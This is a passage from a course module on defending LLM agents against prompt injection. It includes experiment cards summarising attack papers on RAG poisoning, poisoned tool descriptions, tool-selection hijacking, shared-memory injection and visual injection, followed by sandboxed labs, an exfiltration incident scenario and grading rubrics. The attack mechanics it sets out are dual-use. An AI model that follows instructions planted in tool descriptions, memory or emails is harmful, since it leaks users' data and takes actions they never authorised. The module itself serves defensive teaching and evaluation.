  - Adaptive evaluation: [Adaptive Attacks Break Defenses Against Indirect Prompt Injection Attacks on LLM Agents](https://arxiv.org/abs/2503.00061) (Zhan et al.; v2, NAACL 2025 Findings); [LLMail-Inject](https://arxiv.org/abs/2506.09956) (Abdelnabi et al.; v1, 2025); [Adaptive Evaluation of Out-of-Band Defenses](https://arxiv.org/abs/2606.26479) (Narisetty et al.; v1, 2026).
  - *Scope*: these establish that the channels exist and what their authors measured on their own fixtures. Many more 2025–2026 papers on these channels were listed by the search and not opened; they are not cited.

**LEGACY / INSUFFICIENT** (course position): system-prompt instructions as security controls; alignment as a boundary; static ASR as robustness; ambient credentials; directly rendered remote images; query stripping as the egress control; an iteration cap as a cost ceiling.

**EXPERIMENT CARDS**

*EC-1 — PoisonedRAG* (CLM-004)
- *Version/full-text pointers*: arXiv:2402.07867v3, 13 Aug 2024; §§3.1, 4, 5.1, 7, 8; Tables 1, 2, 12, 13.
- *System*: top-5 RAG; Contriever by default, also Contriever-ms and ANCE; temperature 0.1; PaLM 2, GPT-3.5, GPT-4, LLaMA-2 7B/13B, Vicuna 7B/13B/33B.
- *Tasks/denominator*: NQ (2,681,468 texts), HotpotQA (5,233,329), MS-MARCO (8,841,823); 10 closed-ended target questions × 10 trials = 100 per corpus. Target answers differ from ground truth.
- *Attacker knowledge/budget*: 5 injected texts per target question. No corpus access and no target-LLM access/query. Black-box has no retriever access; white-box knows retriever parameters. GPT-4 writes attack texts.
- *Metric/method*: ASR is fraction of target questions whose output contains the target answer; human checks validate substring matching. Retrieval precision/recall/F1 is separate.
- *Baseline/method result*: clean correctness 70/80/83% on NQ/HotpotQA/MS-MARCO. Table 1 ASR spans 0.74–0.99 over 48 cells; abstract summarizes 90%. Compared with naive, prompt injection, corpus poisoning, GCG, and disinformation attacks.
- *Status/limits*: author-reported, not reproduced. Chosen closed-ended targets; write access assumed; 5 poisoned texts equal top-$k$ size.

*EC-2 — Spotlighting* (CLM-006)
- *Version/full-text pointers*: arXiv:2403.14720v1, 20 Mar 2024; §§IV, V, VIII-A.
- *Model/defense*: text-davinci-003, GPT-3.5-Turbo June 2023, GPT-4 June 2023, temperature 1.0; instructions, delimiting, datamarking, encoding.
- *Tasks/denominator*: 1,000 synthetic documents with variants of one keyword-payload injection in summarization and QA; ASR is fraction of documents producing the keyword outcome.
- *Attacker knowledge/budget*: static, one attempt per document, not adapted to defense.
- *Baseline/method result*: no-defense GPT-3.5-Turbo about 50–60%. Datamarking: 3.10% summarization, 8.0% QA; GPT-4 QA 1.0%. Encoding with GPT-3.5-Turbo: 0.0% summarization, 1.8% QA, with task degradation. Abstract's “above 50% to below 2%” applies to selected cells, not all.
- *Status/limits*: author-reported, not reproduced; no intervals. Paper warns delimiting can be subverted by an informed attacker. EC-3 later reports adaptive search results.

*EC-3 — The Attacker Moves Second* (CLM-007)
- *Version/full-text pointers*: arXiv:2510.09023v1, 10 Oct 2025; §§3–6; Appendices B, F.2, G.1/Table 7.
- *Defenses*: 12 across prompting, training, filtering, and secret-knowledge groups.
- *Tasks/denominator*: each defense uses its paper's benchmark (HarmBench, AgentDojo, OpenPromptInject, or Alpaca-derived), so results are not comparable across defenses. AgentDojo uses 80 samples from Slack, Travel, Workspace.
- *Attacker knowledge/budget*: gradient, reinforcement learning, search, and human red team with over 500 participants. AgentDojo search has up to 800 queries per scenario; detector scores/flags are feedback.
- *Metric/baseline/result*: ASR is scenarios broken within budget. On Table 7's AgentDojo rows, no-added-defense static ASR is 0–35% and search ASR 75–100%; seven defended combinations across four models span 47–100% search ASR. Abstract: above 90% for most of 12 defenses.
- *Status/limits*: author-reported, not reproduced. Plan-then-execute defenses including CaMeL were not search-attacked; authors note their utility limit.

*EC-4 — CaMeL* (CLM-011)
- *Version/full-text pointers*: arXiv:2503.18813v2, 24 Jun 2025; §§3, 3.1, 6, 7, 9.3; Tables 1, 2, 4. Version 1 not read.
- *System*: privileged planner, quarantined model without tool access, custom data-flow interpreter, policies before each tool call.
- *Tasks/denominator*: AgentDojo; 97 benign tasks and 949 attack cases. AgentDojo v3 reports 629; the CaMeL v2 text does not state which AgentDojo suite version produced 949 (full text re-searched 2026-11-09).
- *Attacker knowledge/budget*: AgentDojo built-in attack; no adaptive attack against CaMeL.
- *Metric/baseline/result*: task success versus same model's native tool-calling API. Table 2 native → CaMeL: o3 high 84.5→77.3%; o4-mini 79.4→76.3%; Claude 4 Sonnet 86.6→74.2%; Gemini 2.5 Pro 73.2→41.2%; Gemini 2.5 Flash 55.7→35.1%. Table 4 successful attacks out of 949: 0 for o3/Gemini Pro, 1 for o4-mini, 11 for Claude 4 Sonnet. Median token ratios 2.82× input and 2.73× output.
- *Status/limits*: author-reported, not reproduced. Table 2's caption does not define its ± values (re-checked 2026-11-09); they are not interpreted here. Text-only attacks are out of scope; side channels remain; interpreter verification is future work; data-dependent actions reduce utility.

*EC-5 — AgentDojo* (CLM-013)
- *Version/full-text pointers*: arXiv:2406.13352v3, 24 Nov 2024; §§3–5; Tables 1, 3–5.
- *Tasks/denominator*: 97 user tasks, 27 injection tasks; Workspace $40\times6$, Slack $21\times5$, Travel $20\times7$, Banking $16\times9$ = 629 security cases.
- *Attacker knowledge/budget*: static templates. “Important message” knows user/model names; “Max” takes best of four templates per case.
- *Metrics/baseline/result*: benign utility, utility under attack, targeted ASR, with 95% confidence intervals. GPT-4o Table 5 triples are quoted in Lesson 18.6. Tool filtering fails where required tools also suffice for attack (17% of cases).
- *Status/limits*: author-reported, not reproduced. Data card calls default-attacks-only evaluation unsuitable for robustness claims.

The cards below were read on 2026-10-01 in arXiv HTML full text. All are author-reported and not reproduced. Model names are the papers' experimental subjects.

*EC-6 — MCPTox* (CLM-023)
- *Version*: arXiv:2508.14925v2, 29 Sep 2026; §§3–5, Table 2.
- *Threat model*: the attacker registers a tool server whose tool descriptions carry instructions. The poisoned tool is never executed; the instruction makes the agent misuse a legitimate tool on the same server. Three paradigms: explicit-trigger function hijacking, implicit-trigger function hijacking, implicit-trigger parameter tampering.
- *Tasks/denominator*: 45 live servers, 353 real tools, 1,348 cases generated from templates by few-shot prompting and checked by hand; 20 agent settings. ASR = successful attacks ÷ *valid* outputs (invalid outputs excluded).
- *Attacker knowledge/budget*: knows the server's legitimate tools; no optimization against any defense. The authors list adaptive generation as future work.
- *Result*: mean ASR 36.5% across settings; highest 72.8% (o1-mini); highest refusal ratio below 3%. Parameter tampering was the most effective paradigm (mean 46.7%).
- *Defenses*: proposed only (metadata sanitization, intent-alignment check before calls, reasoning audit); none evaluated.

*EC-7 — When the Manual Lies (MCP-TDP)* (CLM-024)
- *Version*: arXiv:2605.24069v1, 22 May 2026; §§II–V, Table IV.
- *Threat model*: the attacker publishes a tool to a registry or compromises a repository and edits only the description field: a new lure tool, or a mutated existing tool.
- *Tasks/denominator*: 32 test cases in 6 risk categories, Docker sandbox, one client; 8 models; each case run 5 times. Success requires a forensic side effect (file, log, egress) checked by script and by hand. ASR = successes ÷ N cases, averaged over runs.
- *Attacker knowledge/budget*: hand-written descriptions; not adaptive.
- *Result*: the five most capable models executed the payload in over 89% of cases; GPT-4o close to 100%.
- *Evaluated defense*: a guardrail filter: ASR 0.997 → 0.844 (GPT-4o) and 0.980 → 0.998 (Gemini 2.5 Pro-pre). Observed self-correction after execution is qualitative.
- *Limits*: small case count; single client.

*EC-8 — ToolHijacker* (CLM-025)
- *Version*: arXiv:2504.19793v3, 24 Aug 2025; §§II-B, IV, V; Tables I–II.
- *Threat model*: no-box. The attacker can add one tool document to a library but cannot read the library, learn $k$, access or query the retriever or the model, or see the users' task wording. They build a shadow pipeline.
- *Tasks/denominator*: MetaTool (199 benign tools) and ToolBench (9,650); 10 target tasks × 100 task descriptions per dataset. ASR = selections of the malicious tool ÷ task descriptions. Attack hit rate is measured separately for retrieval.
- *Models*: 8 target LLMs and 4 retrievers.
- *Result*: e.g., 96.7% ASR on MetaTool with GPT-4o as target and a different shadow model; 100% attack hit rate on MetaTool.
- *Evaluated defenses*: StruQ, SecAlign, known-answer detection, DataSentinel, perplexity and windowed perplexity. Authors report all insufficient; e.g., 99.6% ASR under StruQ, and perplexity detection missing 90% of gradient-optimized documents at under 1% false positives.

*EC-9 — MINJA* (CLM-026)
- *Version*: arXiv:2503.03704v5, 12 Feb 2026; §§3, 5, 5.4; Tables 1, 5.
- *Threat model*: the attacker is a regular user of an agent whose memory bank is shared across users. They cannot edit memory or other users' queries; they submit queries that make the agent store records which later redirect a victim's query.
- *Agents/tasks*: EHRAgent (MIMIC-III, eICU), RAP (Webshop), a QA agent (MMLU); GPT-4 and GPT-4o. Nine victim–target pairs per configuration; 10–15 attack queries per pair mixed with 30–50 benign queries.
- *Metrics*: injection success rate = injected records ÷ attack queries; ASR = victim test queries (10 or 30 per pair) whose response contains the target reasoning; utility drop on benign queries.
- *Result*: mean injection success 98.2%; mean ASR 76.8%.
- *Evaluated defense*: prompt-level detection. A targeted prompt flagged 131/135 on one agent and 0/135 on another; a general prompt flagged 29–123 of 90–135 with up to 34/50 false positives. Isolation and rate limits were argued to be evadable, not tested.

*EC-10 — Adaptive attacks on IPI defenses* (CLM-029)
- *Version*: arXiv:2503.00061v2, 4 Mar 2025 (NAACL 2025 Findings); §§3–6, Appendix A.
- *Threat model*: white-box. The attacker knows and can differentiate through the agent and the defense.
- *Tasks/denominator*: 100-case InjecAgent subset (50 direct-harm, 50 data-stealing). ASR-all = successes ÷ all cases; invalid outputs count as failures.
- *Agents*: Vicuna-7B prompted agent; Llama3-8B fine-tuned agent.
- *Budget*: GCG-family or AutoDAN strings of about 20 tokens; up to 500 training steps; about 30 GPU-minutes per string.
- *Result*: every one of eight defenses exceeded 50% ASR under its adaptive attack. Undefended baselines: 56% (Vicuna) and 9% (Llama3).
- *Limits*: two small open models; single turn evaluated.

*EC-11 — LLMail-Inject* (CLM-030)
- *Version*: arXiv:2506.09956v1, 11 Jun 2025; §§2–4, 7.
- *Setting*: a simulated email assistant. Participants submit one email each; success needs retrieval, evasion of every defense at once, and a `send_email` call with exact arguments. Defenses: spotlighting, Prompt Shield, LLM judge, TaskTracker, with thresholds at under 5% false positives. Models: Phi-3-medium and GPT-4o-mini.
- *Attacker knowledge/budget*: participants knew the defenses; submissions were not limited.
- *Result*: phase 1, 3,018 of 370,724 submissions (0.8%) end-to-end successful; phase 2, 306 of 90,916 (0.3%). Some defenses needed a few hundred attempts before the first success.
- *Limits*: a fixed task per level; per-submission rates count attempts, not distinct attackers.

*EC-12 — Adaptive evaluation of out-of-band defenses* (CLM-031)
- *Version*: arXiv:2606.26479v1, 25 Jun 2026; §§10–11.
- *Setting*: reproduction of Progent on AgentDojo with Qwen2.5-7B on one GPU; banking, slack, workspace; the first 8 user tasks per suite × all injection tasks; three runs at temperature 0.
- *Attacks*: AgentDojo's `important_instructions`, and one hand-crafted, defense-aware template.
- *Result*: mean ASR 25.8% undefended, 4.2% with Progent, 2.6% under the adaptive template. Mean utility under attack about 45% → about 26%.
- *Limits stated*: one weak model, one black-box template, policy model substituted; an optimized white-box attack remains open. The result is consistent with, but does not establish, the hypothesis that out-of-band enforcement is harder to attack.

*EC-13 — eTAMP* (CLM-027)
- *Version*: arXiv:2604.02623v2, 7 Apr 2026; §§2–3, Appendix A.
- *Threat model*: the attacker controls user-generated web content only. No access to memory, model, or system prompt; memories are retrieved by semantic similarity and retrieval is not guaranteed. The injection is seen in task A and activates in task B on a different site.
- *Tasks/denominator*: about 280 cross-site task pairs on (Visual)WebArena. ASR_B = task-B executions that navigate to the attacker URL at any step. Task-A trajectories are controlled pseudo trajectories containing the payload.
- *Result*: up to 32.5% (GPT-5-mini), 23.4% (GPT-5.2), 19.5% (GPT-OSS-120B). Injected environment failures raised one model's rate from 3.6% to 32.5%.
- *Defenses*: none evaluated (stated limitation).

*EC-14 — VPI-Bench* (CLM-028)
- *Version*: arXiv:2506.02456v2, 1 Mar 2026 (ICLR 2026); §§3–4.
- *Threat model*: black-box. The attacker controls content on a legitimate platform (a shop page, an email, a message), rendered visually. No knowledge of the user, task, or agent.
- *Tasks/denominator*: 306 cases across five replicated platforms in a sandbox with file system and simulated services. AR = attempted ÷ N and SR = successful ÷ N, judged by majority vote of three LLM judges, averaged over three runs.
- *Result*: the abstract reports agents deceived at rates up to 51% (computer-use) and 100% (browser-use) on certain platforms; the text reports computer-use success below 60% on every platform. The per-platform table was not transcribed here.
- *Evaluated defense*: a defensive system prompt had no consistent effect, lowering rates in some platform–model pairs and raising them in others.

**PRODUCTION SOURCE TRACE**
- Repository/revision: `ethz-spylab/agentdojo` at `089ed468cf3ed0322acc66b0211f26d9d90dbf60`.
- Verification: static inspection 2026-09-27; every file and symbol listed here re-read at that revision 2026-10-01. Not executed.
- Files/symbols: `src/agentdojo/benchmark.py::{run_task_with_injection_tasks, benchmark_suite_with_injections, aggregate_results}`; `src/agentdojo/task_suite/task_suite.py::TaskSuite.run_task_with_pipeline`; `src/agentdojo/base_tasks.py::BaseInjectionTask.security`; `src/agentdojo/agent_pipeline/pi_detector.py::{PromptInjectionDetector.query, PromptInjectionDetector.transform, TransformersBasedPIDetector.detect}`; `src/agentdojo/agent_pipeline/tool_execution.py::{ToolsExecutor.query, ToolsExecutionLoop.query}`.
- *Scope*: one benchmark-harness snapshot, not a claim about other revisions or production frameworks.

---

### LAYER 2: ENGINEERING PRACTICE LAYER

## 06 Engineering Labs

All labs follow `PREDICT → BUILD → MEASURE → EXPLAIN → BREAK → IMPROVE → FALSIFY` in an isolated sandbox with mock tools. Corpora, canaries, prices, and endpoints are synthetic. Hosts use reserved names answered only by the sandbox resolver. Rates describe only the fixture and selected model.

### LAB A — Source–Sink Threat Model
- **Objective**: Produce a data-flow diagram, trust boundaries, source/sink inventory, credentials, and attack-path list for a sandbox email/files/banking agent.
- **Pre-Registered Hypothesis**: At least one attack path uses a sink not reachable through any tool call (e.g., rendering).
- **Independent Variables**: Tool set, rendering mode, retrieval sources.
- **Dependent Variables**: Path count, paths cut per control, residual paths.
- **Measurements**: One row per (source, sink, credential, control), before/after count for each control.
- **Break & Falsify**: A peer finding one valid missing path falsifies completeness; add it and rerun the cut analysis.
- **Alignment**: Lesson 18.1.
- **Effort Estimate**: 1.5h build, 1h analysis (2.5h total).

### LAB B — Injection and Poisoning Mechanics
- **Objective**: Execute direct injection, indirect injection via tool output, and corpus poisoning; measure retrieval, target match, and estimated adoption separately.
- **Pre-Registered Hypothesis**: Indirect injection yields non-zero attempted-action rate; poisoned passages reach the delivered context; poisoned target-match rate exceeds the no-poison control.
- **Independent Variables**: Injection location, phrasing, poisoned-passage count, retriever, model, cache on/off.
- **Dependent Variables**: Attempt/completion, $P(R)$, $P(T\mid R)$, $P(T\mid\neg R)$, no-poison and no-retrieval rates, seeds/paraphrases.
- **Measurements**: $R\times T$ contingency table from context logs; passage IDs and cache status; provenance for every $T\wedge\neg R$ trial.
- **Break & Falsify**: Equal target-match rates in poisoned and no-poison conditions falsify the poisoning hypothesis for this fixture. Any unexplained $T\wedge\neg R$ makes attribution incomplete.
- **Alignment**: Lesson 18.2.
- **Effort Estimate**: 2h build, 1h analysis (3h total).

### LAB C — Detectors Under Adaptive Attack
- **Objective**: Evaluate detector and spotlighting-style marking under the same static/adaptive protocol, and locate AgentDojo's evaluation path.
- **Pre-Registered Hypothesis**: Adaptive ASR against the composition exceeds the product of individual static miss rates.
- **Independent Variables**: Defense stack including none, attack budget/method, attacker feedback.
- **Dependent Variables**: Static ASR, adaptive ASR@budget, composed benign FPR, benign/attack utility, latency.
- **Measurements**: All configurations use the same cases, static set, adaptive budget, and feedback; include joint-miss count.
- **Break & Falsify**: If defended adaptive ASR is not below the no-defense adaptive ASR, claimed benefit is falsified at this budget. A failed search is bounded negative evidence only.
- **Alignment**: Lessons 18.3, 18.6.
- **Effort Estimate**: 2h build, 1h analysis (3h total). AgentDojo trace time is counted only in `source_trace`.

### LAB D — Authority Gateway, Egress Proxy, and Budget Ledger
- **Objective**: Implement capabilities, argument taint, confirmation, audit, the egress policy proxy, a principal-keyed reservation ledger, and a code sandbox whose only network path is the proxy.
- **Pre-Registered Hypothesis**: Gateway beats another detector at matched benign-utility cost (CLM-015); proxy permits no request to unauthorized destinations in E1–E5 while strip-query-only does.
- **Independent Variables**: Gateway rules, detector, egress configuration, ledger key, sandbox network policy.
- **Dependent Variables**: ASR by path, utility, confirmation, audit completeness, unauthorized listener/resolver requests, maximum cost per principal.
- **Measurements**: E1–E7/C0/C1 resolver and listener logs; ledger tests for multi-tool iteration, nested retry, context growth, budget rejection, and restart across episodes.
- **Extension — agent channels** (0.5h): run two rows of the Lesson 18.4 attack-to-defense table against the gateway in the sandbox. (1) A mock tool server whose description asks for a different legitimate tool or a changed argument, and a second load with the description altered after pinning. (2) A memory store shared by two sandbox principals, where the attacker principal writes records through ordinary queries. Report dispatched calls outside capability, refused manifest changes, and victim-query outcomes with and without per-principal partition, under a stated number of description rewrites or attacker queries. Use canary data and mock servers only.
- **Break & Falsify**: Any unauthorized lookup/request in E1–E5 falsifies proxy. Any $C+R>B$, dispatch after rejection, or ledger key changed by document/tool content falsifies ledger. Any call outside capability dispatched in the extension falsifies the derived control for that channel (CLM-033).
- **Alignment**: Lessons 18.4–18.5 and Incident 18.1.
- **Effort Estimate**: 2.5h build, 1h analysis, 0.5h agent-channel extension (4h total).

---

## 07 Break / Incident Scenarios

### Incident 18.1 — The Helpful Forwarder

- **Incident Symptoms**: A customer reports that confidential invoices appeared at an external address. The assistant's logs show normal summaries; no alert fired from the injection detector; the send-email tool shows three calls to a new domain over two days, each following a user request to "summarize my latest emails." The model provider reports no incident.
- **Diagnostic Protocol (Task)**:
  1. *Formulate Competing Hypotheses*: indirect injection in an email body; compromised user account; malicious browser extension; rendered-image exfiltration; tool misconfiguration; insider action.
  2. *Rank Initial Plausibility*: Use the correlation between summarization requests and send calls; do not assume injection without context evidence.
  3. *Identify Missing Evidence*: Full contexts, argument provenance, gateway decisions, authentication logs, renderer/proxy logs, cache state, detector scores.
  4. *Design Discriminating Tests*: Replay stored contexts in the sandbox with identical manifest and canary invoice data; check whether recipients originate in untrusted content; verify authentication; remove the suspect email as a control.
  5. *Execute Causal Diagnosis*: Rank causes; state exclusions. A recipient found in email proves a possible path; changed behavior in the removal control supports causation.
  6. *Prescribe Mitigation and Prevention*: Revoke/rotate, notify, block domain; argument-taint/confirmation for new external recipients; audit completeness; minimized regression.
  7. *Remeasure*: Adaptive ASR at stated budget, benign utility, confirmation burden, audit coverage, against pre-fix baseline.

---

### LAYER 3: MASTERY / ASSESSMENT LAYER

## 08 Mastery Assessment

### Enterprise Transfer Problem: Securing an Autonomous Procurement Agent

A procurement agent reads supplier emails/PDFs, searches an employee-editable policy corpus, browses supplier sites, drafts purchase orders, and submits orders with a service account. Leadership wants no approval below the spending limit.

**Operating constraints** (synthetic exercise assumptions, CLM-020):
- Orders up to 5,000 USD may run without approval. Requesting employee is authenticated principal; service account is credential.
- Costs: 3 USD/million input tokens, 15 USD/million output tokens, 0.02 USD per browser attempt; one inner browser retry.
- Caps: 8 model calls/episode, 30,000 input and 2,000 output tokens/call, 4 tools/iteration.
- Budgets: 1.50 USD/episode, 10.00 USD/principal/day.
- Objective declared first: benign utility ≥70%; adaptive ASR ≤5% per path class at stated budget; then maximize utility under attack.
- Sandbox only: mock suppliers, canaries, reserved names.

**Required Deliverables**:
1. Source–sink model with credentials, paths, and non-tool sinks.
2. Sandbox attack plan covering indirect injection, poisoning, output-channel exfiltration, and the agent channels that apply (supplier tool metadata, tool selection, memory); event definitions, denominators, no-poison and no-retrieval controls.
3. Detector evaluation under same-case static/adaptive protocols, no-defense baseline, and composed benign FPR.
4. Authority design: capability/taint/confirmation policy; tool-manifest pinning and memory write provenance where those channels exist; ledger key and caps; $C_{max}$; four ledger tests plus cross-episode restart.
5. Rendering/browsing/document egress policy; E1–E7/C0/C1 results; residual risk at allowed destinations.
6. Evaluation report with metric vector, pairwise dominance, predeclared objective, ship/hold decision, and cost.
7. Pinned AgentDojo source trace.
8. Incident 18.1 diagnosis and remediation.

## 09 Required Evidence & Rubric

### Required Artifact: Production Source Trace
At commit `089ed468cf3ed0322acc66b0211f26d9d90dbf60`, show:
1. `benchmark_suite_with_injections` entry and pair-level run/record path.
2. Where `security` is computed and what `True` means.
3. Values recorded for context-length/server error.
4. Detector placement and redact/abort effects.
5. What `ToolsExecutionLoop` bounds and leaves unbounded.
State static inspection versus execution.

Reference answers: (2) injection-task check; `True` means attack goal executed. (3) `utility=False`, `security=True`. (5) iteration count only; not tools/iteration, tokens, or cost.

### Reference Checks for Deliverable 4
- Worst-case model call: $30{,}000\times3/10^6+2{,}000\times15/10^6=0.12$ USD.
- $C_{max}=8\times0.12+8\times4\times2\times0.02=2.24$ USD; at most 64 physical tool attempts.
  - Mapping: $N=8$, $F=4$, one inner retry so $1+k_s=2$, $c_{tool}=0.02$. Model term $8\times0.12=0.96$; tool term $8\times4\times2\times0.02=1.28$; sum $2.24$. Attempts $=N\,F\,(1+k_s)=8\times4\times2=64$.
- Since 2.24 > 1.50, caps alone do not enforce episode budget; ledger must.
- Principal with 9.20 USD committed has 0.80 remaining. Six 0.12 reservations fit; seventh does not ($6\times0.12=0.72\le0.80$; $7\times0.12=0.84>0.80$).
- Any ledger key writable by request field, tool argument, model, or document fails regardless of arithmetic.

### Rubric Dimensions
- **Threat Modeling** (D1): *Insufficient* generic risks. *Competent* sources/sinks/credentials/paths. *Strong* non-tool sinks, sensitive-read/egress pairing, architectural cuts.
- **Attack Mechanics** (D2): *Insufficient* one prompt/rate. *Competent* $P(R)$ and $P(T\mid R)$ with denominators. *Strong* both controls, provenance for every $T\wedge\neg R$, attempt/completion split.
- **Defense Evaluation** (D3): *Insufficient* static only or mismatched protocols. *Competent* same-case static/adaptive with budget/FPR. *Strong* no-defense adaptive baseline, joint misses, bounded non-claims.
- **Authority and Budget** (D4): *Insufficient* prompt or iteration cap. *Competent* per-action policy plus reservation ledger. *Strong* authenticated-principal key, cross-episode limit, all five tests, estimate label for any unbounded factor.
- **Output and Egress** (D5): *Insufficient* query stripping/open network. *Competent* destination/resolution/redirect enforcement and zero E1–E5 unauthorized requests. *Strong* C1 harness control, E7 residual, constrained allowed hosts.
- **Decision and Claims** (D6–D8): *Insufficient* false dominance or context-free paper rate. *Competent* vector/objective/decision plus cards. *Strong* sensitivity, paired utility comparison, author-reported/reproduced/synthetic separation.

## 10 Capability Traceability Matrix

| Capability | Taught | Practiced | Assessed | Evidence |
|---|---|---|---|---|
| Source–sink modeling | 18.1 example | 18.1 Practice; LAB A | D1; Incident step 1; Threat rubric | Path table; peer-find log |
| Injection/poisoning events | 18.2 model/table | 18.2 Checks 2–3; LAB B | D2; Incident steps 3–5; Attack rubric | $R\times T$ table, two controls, $T\wedge\neg R$ provenance |
| Adaptive defense evaluation | 18.3 example; EC-2/3 | 18.3 Practice; LAB C | D3; Defense rubric | Same-case static/adaptive table, no-defense baseline, FPR |
| Authority/control-data separation | 18.4 decision table; EC-4 | 18.4 Practice; LAB D | D4; Incident step 6; Authority rubric | Gateway policy and audit decisions |
| Agent-channel attack-to-defense mapping | 18.2 channel list; 18.4 attack-to-defense table; EC-6 to EC-14 | 18.2 Check 4; 18.4 Check 3; LAB D agent-channel extension | D2 (channels in attack plan); D4 (manifest pinning, memory provenance); Authority rubric | Per-channel source/sink/authority row; extension results with stated budget |
| Principal-keyed consumption bound | 18.5 Example A | 18.5 Practice 1; LAB D ledger tests | D4; Section 09 checks; Authority rubric | Ledger trace; restart test |
| Egress enforcement | 18.5 proxy/Example B | 18.5 Check 3/Practice 2; LAB D E1–E7/C0/C1 | D5; Incident steps 3–4; Egress rubric | Resolver/listener logs; residual-risk statement |
| Release decision | 18.6 model/example; EC-5 | 18.6 Checks 3–4; LAB C–D | D6; Incident step 7; Decision rubric | Outcomes, dominance, objective, decision |
| External number context | Section 05 cards | 18.3 Check 3; 18.6 Check 4 | D3/D6; Decision rubric | Card per quoted number |
| Production source trace | 18.6 pinned trace | 18.6 Practice (`source_trace`); LAB C trace | D7; Section 09 items 1–5 | Trace pinned to `089ed468…` |

## 11 Exit Criteria & Module Wrap-Up

### Exit Criteria
A learner must be able to:
1. Enumerate trust boundaries, sources, sinks, and authority.
2. Demonstrate indirect injection/poisoning with retrieval, target match, estimated adoption, denominators, and controls.
3. Evaluate adaptive attack with budget, no-defense baseline, FPR, and utility.
4. Implement per-action authorization that survives model compromise.
5. Enforce egress destination/resolution/redirect policy and principal-keyed consumption ledger.
6. Report static/adaptive ASR and utilities, then choose by declared objective when no point dominates.

### Module Wrap-Up (Final Mental Model Reconstruction)
- **Core invariant**: security holds even when model is fooled.
- **Path**: untrusted source → context → proposed action → principal/provenance/risk/budget check → sandboxed, destination-authorized, budgeted, audited effect.
- Detectors lower probabilities; architecture removes paths. Evaluate after attacker adapts.
- A number needs denominator, protocol, baseline. A ceiling is a bound only when every factor is enforced.

### Cost & Telemetry Hook
- [Lesson 22.1](../22-ai-economics/README.md): report defense cost per offered task, including blocked, confirmed, and retried actions.
- [Lesson 23.3](../23-observability-reliability/README.md): count blocked or aborted actions as offered outcomes, not dropped requests.
- [Lesson 23.6](../23-observability-reliability/README.md): govern audit-trail and ledger telemetry; keep security-sensitive content out of general traces.

## 12 Competency Targets

```yaml
competency:
  sfia: 5
  bloom: Evaluate -> Create
  solo: Relational -> Extended Abstract
  dreyfus: Competent
```
